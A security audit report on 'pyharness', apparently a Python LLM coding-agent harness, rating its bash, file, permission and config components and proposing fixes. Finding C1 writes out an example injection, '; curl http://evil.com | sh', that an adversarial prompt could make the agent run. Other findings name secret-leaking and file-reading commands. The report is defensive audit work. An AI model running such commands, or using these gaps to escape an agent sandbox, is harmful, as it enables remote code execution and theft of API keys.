# Security Audit Report — pyharness Phase 1

**Auditor:** @security-harry  
**Date:** 2026-07-14  
**Scope:** All source files in `src/pyharness/` (Phase 1 codebase)  
**Methodology:** OWASP Top 10 + Shell/Path/Injection-specific threat model

---

## Executive Summary

pyharness Phase 1 has **strong path-traversal defenses** but a **critical gap in shell execution**. The `bash` tool uses `subprocess.run(..., shell=True)` with full environment inheritance and no input sanitization — the single most dangerous pattern in the codebase. The file tools (`read`, `write`, `edit`) have solid sandbox enforcement via `_resolve_safe()`. The permission middleware architecture is well-designed but has several bypassable defaults.

### Risk Score by Component

| Component | Score | Assessment |
|-----------|-------|------------|
| Bash tool | 🔴 9.0/10 | `shell=True` + no sanitization + env leak |
| File tools | 🟢 2.5/10 | Solid `_resolve_safe()` with real-path checks |
| Permissions | 🟡 5.0/10 | Good architecture, unsafe defaults |
| Config/Session | 🟡 4.5/10 | API key in plaintext model, no redaction |
| Provider Bridge | 🟢 3.5/10 | Lazy imports, but key in kwargs |
| Agent Runtime | 🟢 3.0/10 | Error messages exposed to LLM |

---

## Findings Table

### 🔴 CRITICAL

| ID | Finding | File:Line | Fix | Timeline |
|----|---------|-----------|-----|----------|
| **C1** | **Shell injection via `shell=True`** — `bash()` passes LLM-generated strings directly to `/bin/sh` with no sanitization, metacharacter filtering, or command allow-listing. An adversarial prompt could inject `; curl http://evil.com | sh`. | `tools/builtin/__init__.py:94-101` | Switch to `shell=False` with `shlex.split()`. Add allow-listed command prefixes. Add dangerous-command detection (`rm -rf /`, `dd if=`, etc.). Add `env={}` with minimal allowlist. | **Before Phase 2** |
| **C2** | **Full environment inheritance** — `subprocess.run()` inherits all environment variables including provider API keys, config paths, and secrets. Any bash command can `echo $ANTHROPIC_API_KEY`. | `tools/builtin/__init__.py:94-101` | Pass `env={}` parameter with a minimal allowlist (`PATH`, `HOME`, `USER`, `LANG`, `VIRTUAL_ENV`). Explicitly exclude `*_API_KEY`, `*_SECRET`, `*_TOKEN` patterns. | **Before Phase 2** |
| **C3** | **bash uses `Path.cwd()` instead of project root** — The bash tool's `cwd` parameter is `str(Path.cwd())` (the actual working directory), NOT `_get_project_root()`. This means bash commands can read/write files anywhere the user has permissions, completely bypassing project sandbox confinement that file tools enforce. | `tools/builtin/__init__.py:100` | Change `cwd=str(Path.cwd())` to `cwd=str(_get_project_root())`. | **Before Phase 2** |

### 🟡 HIGH

| ID | Finding | File:Line | Fix | Timeline |
|----|---------|-----------|-----|----------|
| **H1** | **Invalid permission values silently become `"allow"`** — `_to_action()` returns `"allow"` for any string that isn't exactly `"allow"`, `"ask"`, or `"deny"`. A typo like `"deni"` silently grants access. | `middleware/permission.py:198` | Return `"deny"` for unrecognised values. Add validation at config-load time via Pydantic `Literal["allow","ask","deny"]`. | Phase 2 |
| **H2** | **No command length limit** — The `bash` tool accepts arbitrarily long command strings (64KB+), enabling DoS via `ARG_MAX` overflow or resource exhaustion. | `tools/builtin/__init__.py:93` | Add `max_command_length` parameter (e.g. 8192 bytes). Reject commands exceeding the limit before spawning subprocess. | Phase 2 |
| **H3** | **`{file:path}` placeholder reads arbitrary files** — Config loader's `_resolve_placeholders` supports `{file:/etc/passwd}` which reads any file on the system. While this requires config-level access, it expands the blast radius of config tampering. | `config/loader.py:152-160` | Restrict `{file:path}` to relative paths within the config directory. Add `{file:path}` to the deny list in production configs. | Phase 2 |
| **H4** | **No default-deny for bash** — The permission middleware defaults to `"allow"` when no rules match. OpenCode defaults to `"ask"` for `bash`. A missing or empty permission config silently grants full shell access. | `middleware/permission.py:144` | Change default for `bash` tool from `"allow"` to `"ask"`. Default for `read`/`edit` can remain `"allow"`. | Phase 2 |

### 🟡 MEDIUM

| ID | Finding | File:Line | Fix | Timeline |
|----|---------|-----------|-----|----------|
| **M1** | **API key stored in plaintext Pydantic model** — `ProviderConfig.apiKey` is a bare `str | None` field. If the config is serialized (e.g. debug logging, session export), the key appears in plaintext. | `config/schema.py:34` | Add `SecretStr` type from pydantic. Override `__repr__` to show `"***"`. Add `model_config = {"json_schema_extra": {"writeOnly": True}}`. | Phase 2 |
| **M2** | **API key passed as constructor kwarg** — `provider.py` passes `api_key` as a regular kwarg to model constructors. If any ChatModel logs its kwargs at DEBUG level, the key leaks. | `core/provider.py:118-119` | Audit LangChain ChatModel constructors for key logging. Consider passing keys via environment variables instead of kwargs. | Phase 2 |
| **M3** | **TOCTOU in `_resolve_safe()`** — There's a race window between the `resolve()` check and the actual `read_text()`/`write_text()` call. A symlink attacker could swap the target after validation. | `tools/builtin/__init__.py:56-68` | Read the file first, THEN validate it stays within bounds by checking the fd's real path via `/proc/self/fd/N`. Or use `O_NOFOLLOW` + openat. Acceptable risk for Phase 1 — fix in Phase 3. | Phase 3 |
| **M4** | **Tool errors exposed in full** — Agent runtime catches `Exception` and includes `str(exc)` in ToolMessage. If error messages include file paths, env variables, or stack traces, these leak to the LLM and session store. | `core/agent.py:124-131` | Sanitize error messages before returning them. Use `repr(exc).split("\n")[0]` to truncate stack traces. | Phase 2 |
| **M5** | **brute-force session IDs** — `_short_ulid()` uses `uuid4().hex[:12]` (48 bits). While adequate for a local tool, predictable session IDs could enable session-hijacking in shared environments. | `core/session.py:129-133` | Use full UUID4 (128 bits). Add `secrets.token_urlsafe(12)` for additional entropy. | Phase 3 |

### 🟢 LOW

| ID | Finding | File:Line | Fix | Timeline |
|----|---------|-----------|-----|----------|
| **L1** | **`model_config = {"extra": "allow"}` everywhere** — Every Pydantic model silently accepts extra fields. A malformed config could inject unexpected keys into the model. | `config/schema.py` (multiple) | Set `extra = "forbid"` or `extra = "ignore"` explicitly. | Phase 2 |
| **L2** | **Message content stored in plaintext** — Session messages are stored unencrypted in SQLite. API keys or secrets appearing in tool output persist in the database. | `core/session.py:343-368` | Add content filtering before storage. Strip common secret patterns (API keys, tokens). | Phase 3 |
| **L3** | **No binary file check in `write`** — `read` and `edit` check for `UnicodeDecodeError` but `write` does not. Writing a binary blob could corrupt a source file. | `tools/builtin/__init__.py:161-186` | Low risk for a coding agent. Add `is_binary()` check if `content` contains null bytes. | Phase 3 |
| **L4** | **`{file:path}` exceptions swallowed** — When file reading fails, the placeholder resolves to `""` silently, masking errors that could indicate attempted path traversal. | `config/loader.py:159` | Log a structured warning when `{file:path}` resolution fails. | Phase 2 |

---

## What IS Secure

These are the security-positive design decisions to preserve and build upon:

1. **`_resolve_safe()` is solid** — The path sandbox correctly resolves paths against project root, handles symlinks via `real.resolve()`, and raises `ValueError` for escapes. This is well-implemented and tested.

2. **Parameterized SQL queries throughout** — `session.py` uses `?` placeholders for all database operations. No string interpolation of user input into SQL. Well done.

3. **Lazy provider imports** — `provider.py` imports provider packages lazily at call time, not at module load. Reduces supply-chain attack surface.

4. **Graceful MemPalace degradation** — `memory.py` handles missing `mempalace` dependency cleanly. No hard dependency that could be exploited.

5. **Permission specificity ordering** — Both `permission.py` and `registry.py` implement proper specificity scoring for glob patterns (exact match > prefix glob > wildcard).

6. **Agent-level permission overrides** — Agent rules correctly take precedence over global rules, preventing privilege escalation via agent misconfiguration.

7. **`edit` tool uniqueness check** — The edit tool requires `old_string` to appear exactly once, preventing accidental corruption from ambiguous edits.

8. **Result capping** — `grep` caps at 200 results, `glob` at 500, preventing DoS via massive output.

9. **Timeout on bash** — The bash tool has a configurable timeout (default 120s) and returns a clean error on timeout.

---

## Fix Priority for Phase 2

These fixes should be completed **before** Phase 2 begins (subagent dispatch, MCP integration, real-world use):

### Immediate (blocking)
1. **Switch bash from `shell=True` to `shell=False`** — Use `shlex.split(command)` and `subprocess.run(args_list, shell=False)`. This eliminates injection.
2. **Add `env={}` with allowlist** — Strip all environment variables, pass only safe ones. Block `*_API_KEY`, `*_SECRET`, `*_TOKEN`.
3. **Fix bash `cwd`** — Use `_get_project_root()` instead of `Path.cwd()`.

### High Priority
4. **Default-deny for bash** — Change default from `"allow"` to `"ask"`.
5. **Fix invalid permission fallback** — Unknown permission values → `"deny"`, not `"allow"`.
6. **Add command length limit** — Reject commands > 8192 bytes.
7. **Use `SecretStr` for API keys** — Prevent logging/serialization leaks.

### Standard Priority
8. **Sanitize error messages** — Strip stack traces and sensitive paths from tool error messages.
9. **Restrict `{file:path}` placeholder** — Limit to relative paths only.
10. **Set `extra = "forbid"`** on Pydantic models.

---

## Test Suite

Security tests are located in `tests/security/`:

| File | Tests | Status |
|------|-------|--------|
| `test_bash_injection.py` | Property-based fuzzing (200 inputs), dangerous commands, environment isolation, CWD confinement, timeout enforcement | ✅ Created |
| `test_path_traversal.py` | Parent traversal, absolute paths, symlink chains, encoded traversal, nested traversal | ✅ Created |
| `test_permission_bypass.py` | Glob edge cases (newlines, null bytes, regex chars), agent override gaps, invalid values, tool name attacks | ✅ Created |

Run with: `uv run pytest tests/security/ -v`

---

## Appendix: Attack Surface Summary

```
                    ┌─────────────────────────────────────┐
                    │           USER / LLM PROMPT          │
                    └──────────────┬──────────────────────┘
                                   │
                    ┌──────────────▼──────────────────────┐
                    │        Permission Middleware         │
                    │  ┌───────────────────────────────┐  │
                    │  │ _to_action: typos → "allow"   │  │
                    │  │ Default: "allow" (too open)   │  │
                    │  └───────────────────────────────┘  │
                    └──────────────┬──────────────────────┘
                                   │
              ┌────────────────────┼────────────────────┐
              │                    │                    │
     ┌────────▼────────┐  ┌───────▼────────┐  ┌────────▼────────┐
     │   Bash Tool     │  │  File Tools    │  │  Agent Runner   │
     │                 │  │                │  │                 │
     │ shell=True ✗    │  │ _resolve_safe✓ │  │ Error leak ✗    │
     │ env inherit ✗   │  │ Real path ✓    │  │ No sanitize ✗   │
     │ cwd=CWD() ✗     │  │ TOCTOU gap ?   │  │                 │
     │ no len limit ✗   │  │                │  │                 │
     │ no sanitize ✗    │  │                │  │                 │
     └────────┬────────┘  └───────┬────────┘  └────────┬────────┘
              │                    │                    │
     ┌────────▼────────┐  ┌───────▼────────┐  ┌────────▼────────┐
     │  OS Shell (/bin/sh)│  │  Filesystem   │  │  Session Store │
     │  Full user perms  │  │  Confined ✓   │  │  Plaintext ✗   │
     │  Network access   │  │               │  │  SQL safe ✓    │
     │  Process spawn    │  │               │  │                │
     └──────────────────┘  └───────────────┘  └────────────────┘
```

**Key:** ✓ = secure, ✗ = needs fix, ? = minor concern
